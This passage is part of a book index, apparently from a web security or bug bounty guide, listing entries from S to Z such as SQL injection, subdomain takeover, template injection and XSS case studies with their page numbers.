  - Windsor subdomain takeover, 142–143
  - XSS, 61–63
- Shopify Liquid template engine, 62, 72
- Silva, Reginaldo, 113
- Slack OAuth token bug, 171
- sleep command, 87, 90
- Smarty template engine, 72, 78–80, 123
- Snapchat Fastly subdomain takeover, 143–144
- social engineering, 41–42, 48
- software libraries as attack surface, 123, 125
- SOP (same-origin policy), 56–57
- Sopas, David, 115–117
- source code review, 61
- Spelsberg, Max, 134
- SQL databases
  - overview, 82–83
  - prepared statements, 83–84, 90–93
- SQL injection (SQLi) attacks, 81–93
  - countermeasures, 83–84
  - Drupal SQLi, 90–93
  - overview, 81–83, 93
  - combined with SSRF responses, 98
  - Uber blind SQLi, 87–90
  - Yahoo Sports blind SQLi, 84–87
- sqlmap, 89, 215
- SQL statements, 82–83
- SSH (Secure Shell), 126
- SSL pinning, 200
- SSL registration tracking sites, 143, 193
- SSRF See server-side request forgery (SSRF) bugs
- SSTI (server-side template injection) bugs, 72, 74–75, 78–80
- stack memory, 131–132
- state (OAuth), 169
- status codes, 5, 6, 13, 158
- stored XSS, 59, 66–70, 100
- subdomains
  - exposure, 128, 188–189, 192–193, 211
  - overview, 139–140
- subdomain takeover bugs, 139–145
  - Legal Robot takeover, 144–145
  - overview, 139, 141–141, 147, 189
  - scan.me pointing to Zendesk, 142
  - Shopify Windsor takeover, 142–143
  - Snapchat Fastly takeover, 143–144
  - Uber SendGrid email takeover, 145
  - Ubiquiti CNAME, 141–142
- SubFinder, 192–193, 211
- SUID (set user ID), 122
- Swinnen, Arne, 141
- Synack, 220

# T
- The Tangled Web (Zalewski), 221
- Tasci, Mert, 24–25
- technology stack identification, 196–197
- template engines, defined, 71–80
- template injection bugs, 71–80
  - overview, 71–73
  - Uber template injection, 73–76
- testing methodology, 196–200

# U
- Uber bugs
  - blind SQLi, 87–90
  - memcache, 189
  - multiple invitations, 150–151
  - partner race condition, 153–154
  - SendGrid email takeover, 145
  - template injection, 73–76
- unfiltered input exposure, 49, 54, 56, 198
- Unicode, 42–43
- UPDATE statement (SQL), 93
- URL patterns, 197
- URLs, 4–5

# V
- VPS (virtual private server), 192

# W
- WeSecureApp (hacker), 36–37
- Wfuzz, 212
- What CMS, 214
- white-label, 146
- whitelisted assets, 34, 174–176
- Whitton, Jack, 61, 173–174, 223
- whoami command, 98
- Wikiloc XXE, 115–117
- wildcards
  - with certificates, 143, 144
  - and subdomains, 145, 147
- window.location function, 13, 39–40
- window.onload function, 39
- Wireshark web proxy, 210
- XSRF See cross-site request forgery (CSRF)

# X
- XSS See cross-site scripting (XSS) vulnerabilities
- XSSHunter, 60, 198, 215
- XSS Jigsaw blog, 224

# Y
- Yahoo! bugs
  - Mail stored XSS, 63–65
  - PHP info disclosure, 184–186
  - Sports blind SQLi, 84–87
- Yoserial, 215

# Z
- Zalewski, Michal, 221
- Zeropter, 220
- ZAP Proxy, 210
